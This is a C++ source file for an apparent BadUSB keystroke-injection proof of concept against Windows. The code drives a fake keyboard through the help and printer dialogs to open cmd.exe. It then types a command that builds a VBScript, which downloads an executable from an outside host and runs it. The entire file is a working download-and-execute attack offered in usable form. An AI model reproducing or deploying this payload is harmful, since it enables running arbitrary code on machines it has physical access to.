#include "exploit.h"

Exploit::Exploit(){
	this->keyboard = new EvilKeyBoard(0); // 0 for windows
}

void Exploit::launch(){
    this->keyboard->sendKeys(0, KEY_LEFT_WIN);
    this->keyboard->releaseKeys();

    delay(200);

    this->keyboard->sendKeys(0, KEY_F1);
    this->keyboard->releaseKeys();

    delay(1000);

    this->keyboard->sendKeys(KEY_LEFT_ALT, KEY_TAB);
    this->keyboard->releaseKeys();

    delay(500);

    this->keyboard->sendKeys(KEY_LEFT_ALT, KEY_TAB);
    this->keyboard->releaseKeys();

    delay(500);

    this->keyboard->sendKeys(KEY_LEFT_CTRL, 0x13);
    this->keyboard->releaseKeys();

    delay(500);

    this->keyboard->sendKeys(0, KEY_DOWN_ARROW);
    this->keyboard->releaseKeys();

    delay(500);

    this->keyboard->write("microsoft xps");

    delay(500);

    this->keyboard->sendKeys(0, KEY_ENTER);
    this->keyboard->releaseKeys();

    delay(500);

    this->keyboard->write("\t\t\t\t\t");

    delay(500);
    this->keyboard->write("\n");
    delay(500);
    this->keyboard->write("%windir%\\system32\\cmd.exe\n");
    delay(500);
    this->keyboard->write("cd %userprofile%\n");
    delay(500);
    this->keyboard->write("cmd.exe /c \"@echo Set objXMLHTTP=CreateObject(\"MSXML2.XMLHTTP\")>poc.vbs&@echo objXMLHTTP.open \"GET\",\"http://www.greyhathacker.net/tools/messbox.exe\",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject(\"ADODB.Stream\")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile \"mess.exe\">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject(\"WScript.Shell\")>>poc.vbs&@echo objShell.Exec(\"mess.exe\")>>poc.vbs&cscript.exe poc.vbs\" \n");
    while(1) {};
}





